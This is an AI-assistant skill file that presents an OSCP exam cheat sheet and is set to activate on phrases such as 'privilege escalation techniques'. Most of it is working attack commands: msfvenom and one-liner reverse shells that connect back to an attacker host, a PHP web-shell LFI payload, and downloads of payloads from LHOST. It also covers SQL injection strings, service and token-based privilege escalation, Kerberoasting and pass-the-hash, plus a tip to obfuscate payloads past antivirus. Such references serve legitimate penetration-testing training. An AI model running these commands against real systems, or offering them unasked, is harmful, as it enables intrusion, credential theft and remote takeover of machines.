---
name: OSCP Cheat Sheet
description: |
  The assistant provides comprehensive OSCP exam preparation commands and techniques covering enumeration, exploitation, privilege escalation, and Active Directory attacks. Activate when users ask about "OSCP commands," "penetration testing cheat sheet," "privilege escalation techniques," "file transfer methods," or "Active Directory pentesting."
version: "1.0.0"
tags:
  - oscp
  - penetration-testing
  - privilege-escalation
  - active-directory
  - exploitation
---

# OSCP Cheat Sheet

## Purpose

Provide a comprehensive reference for OSCP exam preparation covering enumeration, exploitation, privilege escalation, file transfers, and Active Directory attacks. Enable quick command lookup during assessments.

## Inputs/Prerequisites

- Kali Linux or similar penetration testing distribution
- Network access to target machines
- Basic understanding of Windows and Linux systems
- Familiarity with common exploitation techniques

## Outputs/Deliverables

- Enumerated services and vulnerabilities
- Successful exploitation and shell access
- Elevated privileges on target systems
- Captured credentials and hashes
- Documented attack paths

## Core Workflow

### 1. Port Scanning

```bash
# Basic Nmap scan
nmap -sC -sV -oA nmap_scan -A -T5 10.10.10.x

# Host discovery
nmap -sn 10.10.1.1-254 -vv -oA hosts
netdiscover -r 10.10.10.0/24

# DNS server discovery
nmap -p 53 10.10.10.1-254 -vv -oA dcs

# Full port scan with masscan
masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | uniq | tr '\n' ',')
nmap -Pn -sV -sC -p$ports 10.10.10.x

# Vulnerability scripts
nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x
```

### 2. File Transfers

**Download to Windows:**

```powershell
# PowerShell download
powershell -command Invoke-WebRequest -Uri http://LHOST/file -Outfile C:\temp\file
iwr -uri http://LHOST/file -Outfile file

# Certutil download
certutil -urlcache -split -f "http://LHOST/file" file

# Bitsadmin
bitsadmin /transfer job http://LHOST/file C:\temp\file
```

**Download to Linux:**

```bash
# Wget and curl
wget http://LHOST/file
curl http://LHOST/file -o file

# Netcat transfer
# Receiver:
nc -lvnp 4444 > file
# Sender:
nc TARGET 4444 < file
```

**Upload from Windows to Kali:**

```powershell
# PowerShell upload
powershell (New-Object Net.WebClient).UploadFile('http://LHOST/upload.php', 'file')

# SMB share
# On Kali:
impacket-smbserver share . -smb2support
# On Windows:
copy file \\KALI_IP\share\
```

### 3. Service Enumeration

**FTP (21):**

```bash
# Anonymous login
ftp TARGET
# user: anonymous, pass: anonymous

# Upload shell
put shell.php
```

**SSH (22):**

```bash
# Login with key
ssh -i id_rsa user@TARGET

# Crack passphrase
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**SMB (139/445):**

```bash
# Enumerate shares
smbclient -L //TARGET -N
smbmap -H TARGET
enum4linux -a TARGET
crackmapexec smb TARGET -u '' -p '' --shares

# Connect to share
smbclient //TARGET/share -N

# Mount share
mount -t cifs "//TARGET/share" /mnt/smb -o vers=1.0,user=root
```

**HTTP/HTTPS (80/443):**

```bash
# Directory enumeration
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
feroxbuster -u http://TARGET -w wordlist.txt

# Nikto scan
nikto -h http://TARGET

# CMS enumeration
wpscan --url http://TARGET --enumerate u,p,t
droopescan scan drupal -u http://TARGET
```

**SNMP (161):**

```bash
snmpwalk -c public -v1 TARGET
snmp-check TARGET
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET
```

### 4. Web Attacks

**Directory Traversal:**

```bash
# Linux
../../../etc/passwd
....//....//....//etc/passwd

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows\system32\drivers\etc\hosts
```

**Local File Inclusion:**

```bash
# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id
```

**SQL Injection:**

```bash
# sqlmap basic
sqlmap -u "http://TARGET/page?id=1" --dbs
sqlmap -u "http://TARGET/page?id=1" -D database -T table --dump

# Manual testing
' OR 1=1--
" OR ""="
```

### 5. Exploitation

**Msfvenom Payloads:**

```bash
# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f elf > shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=KALI LPORT=443 -f raw > shell.php

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=443 -f asp > shell.asp

# WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=443 -f war > shell.war
```

**One-Liner Reverse Shells:**

```bash
# Bash
bash -i >& /dev/tcp/KALI/443 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('KALI',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

### 6. Windows Privilege Escalation

**Enumeration:**

```cmd
whoami /all
systeminfo
net user
net localgroup administrators
```

**Automated Scripts:**

```cmd
# WinPEAS
winpeas.exe

# PowerUp
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# Windows Exploit Suggester
windows-exploit-suggester.py --database db.xls --systeminfo systeminfo.txt
```

**Token Impersonation:**

```cmd
# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# JuicyPotato (SeImpersonatePrivilege)
JuicyPotato.exe -l 1337 -c "{CLSID}" -p cmd.exe -a "/c whoami > C:\output.txt" -t *
```

**Service Exploitation:**

```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Check service permissions
accesschk.exe /accepteula -uwcqv "Everyone" *

# Modify service binary
sc config SERVICE binpath= "C:\path\to\evil.exe"
sc stop SERVICE
sc start SERVICE
```

### 7. Linux Privilege Escalation

**TTY Upgrade:**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**Enumeration:**

```bash
id
sudo -l
cat /etc/passwd
cat /etc/crontab
find / -perm -u=s -type f 2>/dev/null
```

**Automated Scripts:**

```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

**SUID Exploitation:**

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# GTFOBins for exploitation
# https://gtfobins.github.io/
```

### 8. Active Directory Attacks

**Enumeration:**

```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Find-LocalAdminAccess

# BloodHound
SharpHound.exe -c all
```

**AS-REP Roasting:**

```bash
# Find accounts
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Crack hash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Kerberoasting:**

```bash
# Get TGS tickets
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request

# Crack hash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

**Pass the Hash:**

```bash
# PsExec
impacket-psexec DOMAIN/admin@TARGET -hashes :NTLM_HASH

# WMI
impacket-wmiexec DOMAIN/admin@TARGET -hashes :NTLM_HASH

# CrackMapExec
crackmapexec smb TARGET -u admin -H NTLM_HASH
```

## Quick Reference

### Password Cracking

```bash
# John the Ripper
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat
hashcat -m MODE hash.txt wordlist.txt

# Common modes: 0=MD5, 1000=NTLM, 1800=sha512crypt, 13100=Kerberoast
```

### Listener Setup

```bash
# Netcat
nc -lvnp 443

# rlwrap (better shell)
rlwrap nc -lvnp 443
```

## Constraints

- Some exploits require specific OS versions
- AV/EDR may block common tools
- Some techniques require local admin or specific privileges
- Network segmentation may limit lateral movement

## Examples

### Example 1: Quick Windows Shell

```bash
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o shell.exe

# Start listener
nc -lvnp 443
```

### Example 2: Basic Priv Esc Check

```bash
# Linux
sudo -l
cat /etc/crontab
find / -perm -4000 2>/dev/null
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Shell dies immediately | Use staged payloads or different encoding |
| AV blocks payload | Try different payload format or obfuscation |
| Cannot escalate | Run automated enumeration scripts |
| Hash won't crack | Try larger wordlists or rules |
| Lateral movement fails | Check firewall rules and credentials |
